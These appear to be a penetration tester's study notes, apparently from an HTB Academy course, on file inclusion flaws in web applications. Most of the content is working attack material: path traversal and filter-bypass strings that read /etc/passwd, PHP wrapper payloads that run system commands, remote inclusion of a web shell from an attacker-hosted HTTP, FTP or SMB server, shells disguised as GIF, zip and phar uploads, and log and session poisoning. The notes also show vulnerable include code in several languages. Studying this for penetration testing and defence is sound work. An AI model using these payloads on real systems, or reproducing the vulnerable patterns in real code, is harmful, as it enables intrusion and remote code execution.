# Introduction

- most common place we usually find LFI within is templating engines
- often seen parameter be like `/index.php?page=about` where index.php is static content (eg - header/footer) and pulls the dynamic content specified in the parameter
- if we can control over the about portion of the request, it may be possible to have the web application grap other files and display them on the page
- LFI vulns can lead to
  - source code disclosure
  - sensitive data exposure
  - remote code execution under certain conditions

# Example of vulnerable code

- LFI can occur in many of the most popular web servers and development frameworks like PHP, NodeJS, Java, .Net and many others
- each of them has a slightly different approach to including local files
- but they all share one common thing: `loading a file from a specified path`
- such a file could be a dynamic header or different content based on the user-specified language
- eg - a page may have a `?language` GET parameter and if the user changers the language from a drop-down menu, the same page would be returned but with a different `language` parameter (eg - ?language=es)
- in such cases, changing language may change the directory the web application is loading the pages from (eg - /en/ or /es/)
- if we control over the path being loaded, we may be able to exploit this vulnerability to read other files and even RCE

# Vulnerable code examples

## PHP

- `include()` function to load a local or a remote file as we load a page

```php
if (isset($_GET['language'])) {
	include($_GET['language'])
}
```

- other functions - `include_once()`, `require()`, `require_once()`, `file_get_contents()`

## NodeJS

```javascript
if (req.query.language) {
  fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
    res.write(data);
  });
}
```

- in Express framework,

```javascript
app.get("/about/:language", function (req, res) {
  res.render(`/${req.params.language}/about.html`);
});
```

## Java

```java
<c:if test="${not empty param.language}">
	<jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

```java
<c:import url= "<%= request.getParameter('language') %>" />
```

## .NET

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
	<% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
}
```

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

# Read Vs Execute

- some of the above functions only read the content of the specified files,
- others also execute the specified files
- some of them allow specifying the remote URLs,
- others only work with files local to the back-end server

| Function                 | Read Content | Execute | Remote URL |
| ------------------------ | ------------ | ------- | ---------- |
| PHP                      |              |         |            |
| include()/include_once() | ✅           | ✅      | ✅         |
| require()/require_once() | ✅           | ✅      | ❌         |
| file_get_contents()      | ✅           | ❌      | ✅         |
| fopen()/file()           | ✅           | ❌      | ❌         |
| NodeJS                   |              |         |            |
| fs.readFile()            | ✅           | ❌      | ❌         |
| fs.sendFile()            | ✅           | ❌      | ❌         |
| res.render()             | ✅           | ✅      | ❌         |
| Java                     |              |         |            |
| include                  | ✅           | ❌      | ❌         |
| import                   | ✅           | ✅      | ✅         |
| .NET                     |              |         |            |
| @Html.Partial()          | ✅           | ❌      | ❌         |
| @Html.RemotePartial()    | ✅           | ❌      | ✅         |
| Response.WriteFile()     | ✅           | ❌      | ❌         |
| include                  | ✅           | ✅      | ✅         |

# Basic LFI

- `/etc/passwd` if `include($_GET['language'])`
- `../../../etc/passwd` if `include("./languages/" . $_GET['language']);`
- `/../../../etc/passwd` if `include("lang_" . $_GET['language']);`

# Basic Bypasses

## Non-recursive path traversal filters

```php
$language = str_replace('../', '', $_GET['language']);
```
- filter is not recursively remove the `../` substring, so
- `....//....//....//etc/passwd`
- `..././..././..././etc/passwd`
- `....\/....\/....\/etc/passwd`

## Encoding

- some web filters may prevent input filters that include certain LFI-related characters such as dot `.` or slash `/` 
- URL encode 
- `%2e%2e%2f%2e%2e%2f%2e%2e%2f` for `../../../`

## Approved Paths

- some apps may use Regular Expressions 
- eg
```php
if (preg_match('/^\.\/language\/.+$/', $_GET['language'])) {
  include($_GET['language']);
} else {
  echo 'Illegal path specified!';
}
```

- `./languages/../../../../etc/passwd`

## Appended Extensions 

- obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4

### Path truncation

- in early versions of PHP, defined strings have a maximum length of 4096 characters due to the limitation of 32 bit systems
- if a longer string is passed, it will simply be trunctated, and any characters after the maximum length will be ignored
- PHP also used to remove trailing slashes and single dots in path names 
  - in `/etc/passwd/.` , `/.` will be truncated and will result `/etc/passwd`
- in linux system in general `////etc/passwd` is same as `/etc/passwd` and also same as `/etc/./passwd` 
- combine those techinques and create very long strings that evaluate to a correct path 
- reaching the 4096 character limitation, the appended extension (.php) would be truncated
- important to note that we would also need to **start the path with a non-existing directory** for this technique to work 

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```
- we can create that path with bash 
```bash
hnwht@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

### Null bytes

- before PHP version 5.5 were vulnerable to null byte injection, adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it
- `/etc/passwd%00.php`

# PHP Filters

- we can utilize [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend the LFI exploitation and even potentially reach RCE

## Input Filters

- [PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify 
- `php://` scheme in our string and access the PHP filter wrapper with `php://filter/`
- parameters for attack are *resource* and *read* 
  - *resource* - required for filter wrappers and with it we can specify the stream we would like to apply the filter on (eg - local file) 
  - *read* - can apply different filters on the input resource, and can use it to specify which filter we want to apply on our resource
- four types of filters 
  - [String Filters](https://www.php.net/manual/en/filters.string.php)
  - [Converson Filters](https://www.php.net/manual/en/filters.convert.php)
  - [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
  - [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)

## Fuzzing for PHP files

```bash
thnwht@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

## Source Code Disclosure

- suppose we find config.php from fuzzing and want to read the source code of the config file 

```url
?language=php://filter/read=convert.base64-encode/resource=config
```
- then decode base-64 for the result string

# PHP Wrappers

- to execute remote commands, depend on the back-end language/framework and the vulnerable function's capabilities

## Data Wrapper

- [Data Wrapper](https://www.php.net/manual/en/wrappers.data.php) - used to include external data including PHP code
- only available to use if the `allow_url_include` setting is enable in PHP config

### Checking PHP Configurations

- ca be found at `/etc/php/X.Y/apache2/php.ini` for Apache or `/etc/php/X.Y/fpm/php.ini` for Nginx where X.Y is installed PHP version

```sh
thnwht@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

- after base 64 decode and if the configuration is on 
```sh
thnwht@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

### Exploit with data wrapper

- if *allow_rul_include* enabled, by using the data wrapper to include external data, including PHP code, we can pass it base64 encoded strings with **text/plain;base64** 

```sh
thnwht@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
- or use with curl
```sh
thnwht@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Exploit with input wrapper

- input wrapper can be used to include external input and execute PHP code
- we can pass our input to the input wrapper as a POST request's data
- the vulnerable parameter must accept POST requests for this attack to work
- input wrapper also depends on the **allow_url_include** setting

```sh
thnwht@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
           
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Exploit with expect wrapper

- [Expect Wrapper](https://www.php.net/manual/en/wrappers.expect.php) - allows to directly run commands through URL streams
- works similar to the web shells
- expect is an external wrapper and needs to be installed manually 
- to know this extension is installed or not, same as allow_url_include, search in the config file as `extension=expect`

```sh
thnwht@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Remote File Inclusion (RFI)

- it allows 
  - enumerating local-only ports and web applications (i.e. SSRF)
  - gaining remote code execution by including a malicious script that we host

- any functions that allows including remote URLs usually also allows including local ones but LFI may not be an RFI as 
  - the vulnerable function may not allow including remote URLs 
  - you may only control a portion of the filename and not the entire protocol wrapper (ex: http://, https://, ftp://)
  - configuration may prevent RFI altogether, as most modern web servers disable including remote files by default 

- check whether `allow_url_include=On` 
- thought it is On, this may not always be reliable
- try and include a URL
- try to include a local URL (http://127.0.0.1:80/index.php) 

```url
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

## RCE with RFI


```sh
thnwht@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
### Through HTTP 

- host that script and include it through the RFI vulnerability
- the exploit server should be port 80 or 443
- server at local computer
```sh
thnwht@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

- get request to the URL 
```url
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

- at the exploit server, will get a GET request to shell.php file 
```sh
thnwht@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

### Through FTP

- host the script with FTP protocol 

```sh
thnwht@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

- get request to the URL

```url
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

- get request with cURL
```sh
thnwht@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Through SMB

- if vulnerable web application is hosted on a Windows server, then we do not need the `allow_url_include` setting to be enabled

```sh
thnwht@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- get request
```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\shell.php&cmd=whoami
```

# LFI and File Uploads

## Image upload

### Crafting malicious image

- create a malicious image containing a PHP web shell code that looks and works as an image
```sh
thnwht@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
- upload that pretended gif file 
- find the path (location) that image was stored (easily be found or fuzz the file path)
- suppose the image path as 
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

- get the URL with LFI vulns
```url
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

## Zip upload

- can use the [Zip Wrapper](https://www.php.net/manual/en/wrappers.compression.php) to execute PHP code
- this wrapper isn't enabled by default, and may not always work

```sh
thnwht@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

- then upload the `shell.jpg` archive with `zip://shell.jpg` zip wrapper and `&cmd=whoami` 

- request URL may look like
```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## Phar upload

- can use `phar://` wrapper to get a similar result
- first write a PHP script into `shell.php` file

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
- this script compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with 
- compile it into a phar file and rename it to shell.jpg as follows;

```sh
thnwht@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

- upload it to the web application and request to this URL
```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

# Log Poisoning

- writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file)
- PHP web app should have read privileges over the logged files 

## PHP session poisoning

- most PHP app utilize PHPSESSID cookie and keep track of user details through their cookies
- these details are stored in session files at `/var/lib/php/sessions/` on Linux and `C:\Windows\Temp\` on Windows
- name of file that contains our user's data matches the name of PHPSESSID cookie with `sess_` prefix
- eg - PHPSESSID cookie set to 1q2w3e4r5t6y7u8i9o and its location on disk would be `/var/lib/php/sessions/sess_1q2w3e4r5t6y7u8i9o`

- get request to this URL
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_1q2w3e4r5t6y7u8i9o
```
- look at the response and find out which parameter can be controlled and change the parameter through URL and get request again to above URL and see what are changing

- eg - get this request `http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning`
  and get again the sessions file and find the word **session_poisoning**

- we can write basic PHP shell by changing the ?language= parameter to URL encoded web shell as 
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

- then include the session file and use the **&cmd=id** to execute a command
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
- to execute send alternatively the payload and command url


## Server Log poisoning

- log file names - `access.log` and `error.log`
- `access.log` file contains various information about all requests made to the server including each request's User-Agent header
- we can control the User-Agent header in the requests and can use it to poison the server logs

- once poisoned, we need to include the logs through the LFI vulnerabilitiy and need to have read-access over the logs
- Nginx logs are readable by low privileged users by default and located at `/var/log/nginx` or `C:\nginx\log`
- Apache logs are only readable by users with high privileges and located at `/var/log/apache2` or `C:\xampp\apache\logs\`
- can use `SecList/Fuzzing/LFI` wordlists
- eg - try to get Apache access log from LFI
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

- try to change the User-Agent header to payload that we want
```
...
User-Agent: <?php system($_GET["cmd"]); ?>
```

- with cURL
```
thnwht@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
```

- then to execute the command, try to get request to
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

- User-Agent header is also shown on process files under the Linux `/proc/` directory and can try including `/proc/self/environ` or `/proc/self/fd/N` where N is PID usually between 0-50

- some of the service logs we may be able to read
  - `/var/log/sshd.log`
  - `/var/log/mail`
  - `/var/log/vsftpd.log`


# Automated Scanning

## Fuzzing parameters with ffuf

```
thnwht@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

- for more precise scan, [most popular LFI parameter](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters)

## Fuzzing LFI path

```
thnwht@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

## Fuzzing Server Files

### Server webroot

```
thnwht@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

### Server log config

```
thnwht@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

